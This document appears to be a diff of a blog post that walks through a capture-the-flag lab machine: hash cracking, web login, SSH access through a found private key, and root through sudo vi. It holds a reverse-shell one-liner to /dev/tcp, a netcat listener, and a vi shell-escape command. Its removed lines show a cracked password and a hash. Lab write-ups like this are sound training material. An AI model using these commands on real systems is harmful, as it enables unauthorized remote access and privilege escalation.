@@ -97,146 +97,105 @@ Keep it safe "
 ## Lets crack this hash:
 [hashes.com](https://hashes.com/en/decrypt/hash)
 
-## It works and we get the password for Charlie !
-
+## We now get the password for Charlie !
 ![Battery Widget]({{ '/assets/images/wonka/10-wonka.png' | relative_url }}){: .center-image }
-
-{% highlight bash %}
-charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:cn7824
-{% endhighlight bash %}
-
 ## This gives our answer to question 2 
-
-_____________________________________________________
+<br>
 
 ## Lets see where we can use this username and password
 ## SSH and FTP both failed to authenticate
 ## Lets try and access the web server instead
-
-
 ![Battery Widget]({{ '/assets/images/wonka/11-wonka.png' | relative_url }}){: .center-image }
 
-{% highlight bash %}
-Charlie
-cn7824
-{% endhighlight bash %}
-
-
 ## We are able to login successfully as Charlie
-## We see that there is immediately a command prompt box
-
+## We see immediately that there is a command prompt box
 ![Battery Widget]({{ '/assets/images/wonka/12-wonka.png' | relative_url }}){: .center-image }
 
 
 ## Lets build a reverse shell and start our netcat listener
 [reverse-shell-cheat-sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet])
-
-
-.................
+<br>
 
 ## First on our attacker machine we will run the command:
-
 {% highlight bash %}
 $ nc -lvnp <port of choice>
 {% endhighlight bash %}
 
 ## Then in the command prompt of the web page we will put our reverse shell:
-
 {% highlight bash %}
-/bin/bash -c 'bash -i >& /dev/tcp/10.2.3.233/4444 0>&1'
+/bin/bash -c 'bash -i >& /dev/tcp/IP_address/4444 0>&1'
 {% endhighlight bash %}
-
 ![Battery Widget]({{ '/assets/images/wonka/13-wonka.png' | relative_url }}){: .center-image }
-
+<br>
 
 ## This gives us a shell back to our listener
-
 ## But we only have www-data access
-
-
 ![Battery Widget]({{ '/assets/images/wonka/14-wonka.png' | relative_url }}){: .center-image }
-
-
+<br>
 
 ## It looks like the user flag is in charlie's home directory and we don't have access
-
 ## Looking around we see a file called teleport and teleport.pub
 ## Weird could these be public and private key files?
+<br>
 
 ## Opening this, we can see the private key inside: >"/home/charlie/teleport"
-
 ![Battery Widget]({{ '/assets/images/wonka/15-wonka.png' | relative_url }}){: .center-image }
 
 ## Lets save this into a text file on our machine
 ## Lets modify the permissions and see if we can get ssh access with these credentials
+<br>
 
 ## First copy and paste the entire private key file text onto your machine
-
-Then run:
+## Then run:
 {% highlight bash %}
 $ chmod +x <private_key_file>
 {% endhighlight bash %}
 
 ## Lets now try authenticate into ssh as Charlie
-
 {% highlight bash %}
 ssh -i id_rsa_file charlie@xxxx
 {% endhighlight bash %}
 
 ## We get access as Charlie !
-
-
 ![Battery Widget]({{ '/assets/images/wonka/16-wonka.png' | relative_url }}){: .center-image }
+ <br>
 
-## Lets capture that user flag
-
+## Lets capture the user flag
 {% highlight bash %}
 cat /home/charlie/user.txt
 {% endhighlight bash %}
-
 ![Battery Widget]({{ '/assets/images/wonka/17-wonka.png' | relative_url }}){: .center-image }
-
-
+<br>
+<br>
+<br>
 # Priv Esc
-
+<br>
+<br>
 
 ## We see sudo -l shows Charlie can run vi commands as root
-
 ![Battery Widget]({{ '/assets/images/wonka/18-wonka.png' | relative_url }}){: .center-image }
+<br>
 
 ## Looking for binary exploits we see a vi script:
-(gtfobins/vi/#sudo)[https://gtfobins.github.io/gtfobins/vi/#sudo]
-
+[gtfobins/vi/#sudo](https://gtfobins.github.io/gtfobins/vi/#sudo)
 {% highlight bash %}
-$ sudo vi -c ':!/bin/sh' /dev/null
+"$ sudo vi -c ':!/bin/sh' /dev/null"
 {% endhighlight bash %}
 
 ## Entering this command is successful
-## We get root access
-
+## We now get root access
 ![Battery Widget]({{ '/assets/images/wonka/19-wonka.png' | relative_url }}){: .center-image }
 
-## look like the root flag is contained within a python script:
-
-{% highlight bash %}
-./root.py
-{% endhighlight bash %}
-
+## It looks like the root flag is contained within a python script:
 ![Battery Widget]({{ '/assets/images/wonka/20-wonka.png' | relative_url }}){: .center-image }
 
-## Lets try an run it:
+## Lets try and run it:
 {% highlight bash %}
 python3 ./root.py
 {% endhighlight bash %}
-
-![Battery Widget]({{ '/assets/images/wonka/21-wonka.png' | relative_url }}){: .center-image }
+<br>
 
 ## Looks like we need the key we found earlier
-
-{% highlight bash %}
->b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
-{% endhighlight bash %}
-
 ![Battery Widget]({{ '/assets/images/wonka/22-wonka.png' | relative_url }}){: .center-image }
  
 ## Entering this we can now get the root flag and pwn this machine !!!
